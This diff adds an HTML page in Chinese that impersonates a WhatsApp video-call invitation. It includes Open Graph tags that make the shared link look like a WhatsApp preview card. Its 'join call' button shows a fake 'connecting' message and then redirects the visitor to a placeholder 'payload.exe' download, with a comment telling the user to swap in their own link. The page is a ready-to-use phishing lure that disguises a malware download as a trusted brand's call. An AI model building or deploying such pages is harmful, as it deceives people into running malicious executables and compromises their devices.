@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>视频通话</title>
+
+  <!-- Open Graph for WhatsApp 预览卡片 -->
+  <meta property="og:title" content="视频通话" />
+  <meta property="og:description" content="请使用以下链接加入我的 WhatsApp 视频通话。" />
+  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1200px-WhatsApp.svg.png" />
+  <meta property="og:url" content="https://yourdomain.com/whatsapp-call.html" />
+  <meta property="og:type" content="website" />
+
+  <style>
+    body {
+      background-color: #e5f5ec;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background-color: white;
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+    }
+    .logo {
+      width: 64px;
+      height: 64px;
+      margin-bottom: 16px;
+    }
+    h2 {
+      margin: 0 0 10px 0;
+      color: #075e54;
+    }
+    p {
+      color: #444;
+      font-size: 16px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 12px 24px;
+      font-size: 16px;
+      background-color: #25d366;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background-color: #1da851;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo" alt="WhatsApp Logo" />
+    <h2>加入 WhatsApp 视频通话</h2>
+    <p>请点击下方按钮加入通话</p>
+    <button onclick="redirect()">加入通话</button>
+  </div>
+
+  <script>
+    function redirect() {
+      document.querySelector('button').innerText = "连接中...";
+      setTimeout(() => {
+        window.location.href = "https://example.com/payload.exe"; // 这里换成你要跳转的链接
+      }, 2000);
+    }
+  </script>
+</body>
+</html>
